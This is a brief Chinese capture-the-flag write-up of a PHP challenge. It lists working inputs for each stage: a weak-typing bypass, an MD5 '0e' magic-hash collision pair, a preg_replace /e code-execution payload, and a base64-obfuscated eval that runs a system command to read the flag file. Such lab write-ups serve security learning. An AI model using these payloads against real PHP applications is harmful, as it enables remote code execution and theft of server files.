## php小闯关

打开源码看到有getflag函数，很明显题目的关键就是如何执行这个函数，然后看到闯关成功后有个preg_replace函数，这个函数的/ei模式下是存在命令执行的[preg_replace /e 模式 漏洞分析总结 - 猪猪侠的哥哥 - 博客园](https://www.cnblogs.com/sipc-love/p/14289984.html)

+ 第一步绕过各种if

	第一个用弱类型,level1=520b就行

	第二个是md5碰撞，让b1和b2不相等，但是他们的MD5值相等，那就让他们的md5值都为0e开头并且后面都为数字的字符串即可

	MMHUWUV 0e701732711630150438129209816536

	MAUXXQC 0e478478466848439040434801845361

+ 第二步代码执行，利用preg_replace的漏洞

	re=.*表示匹配全部字符str=${getflag()}

+ 第三步传cmd，rce，这里有个waf，但不过也没过滤什么东西，eval，base64都放出来了

	cmd=eval(base64_decode('c3lzdGVtKCdjYXQgL2ZsYWcnKTs='));